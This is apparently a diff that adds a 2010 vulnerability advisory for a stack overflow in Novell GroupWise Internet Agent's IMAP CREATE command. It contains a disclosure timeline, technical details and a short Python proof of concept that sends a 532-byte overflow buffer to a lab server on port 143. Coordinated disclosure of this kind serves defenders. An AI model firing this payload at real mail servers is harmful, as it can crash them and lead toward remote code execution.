@@ -1,0 +1,75 @@
+#####################################################################################
+Application:   Novell Groupwise Internet Agent Stack Overflow
+Platforms:   Windows, Linux, Netware (GroupWise 7.0, 7.01, 7.02, 7.03x, 7.04, 8.0, 8.01x)
+Exploitation:   Remote code execution
+CVE Number:   
+Novell TID:  7006374
+Author:   Francis Provencher (Protek Research Lab's) 
+WebSite:   http://www.protekresearchlab.com/
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) The Code
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+Novell, Inc. is a global software and services company based in Waltham, Massachusetts. The company specializes in enterprise operating systems, such as SUSE Linux Enterprise and Novell NetWare; identity, security, and systems management solutions; and collaboration solutions, such as Novell Groupwise and Novell Pulse.
+
+Novell was instrumental in making the Utah Valley a focus for technology and software development. Novell technology contributed to the emergence of local area networks, which displaced the dominant mainframe computing model and changed computing worldwide. Today, a primary focus of the company is on developing open source software for enterprise clients.
+
+(http://en.wikipedia.org/wiki/Novell)
+
+#####################################################################################
+
+============================
+2) Report Timeline
+============================
+
+2010-04-06 - Vulnerability reported to vendor
+2010-07-16 - Coordinated public release of advisory
+(http://www.zerodayinitiative.com/advisories/ZDI-10-129/)
+
+
+#####################################################################################
+
+============================
+3) Technical details
+============================
+
+This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Novell Groupwise Internet Agent. Authentication is required to exploit this vulnerability.
+
+The flaw exists within the IMAP functionality included with GWIA. When provided with an overly long mailbox name to the CREATE verb, the IMAP server can be forced to overflow a buffer on the stack. Successful exploitation leads to remote code execution under the context of the server.
+
+
+#####################################################################################
+
+===========
+4) The Code
+===========
+
+#!/usr/bin/python
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = '\x41' * 532
+
+s.connect(('192.168.100.177',143))
+s.recv(1024)
+s.send('A001 LOGIN test@proteklab.com   test ' + buffer + '\r\n')
+s.recv(1024)
+s.send('A001 CREATE ' + buffer + '\r\n')
+s.recv(1024)
+s.close()
+
+
+#####################################################################################
+(PRL-2010-06)
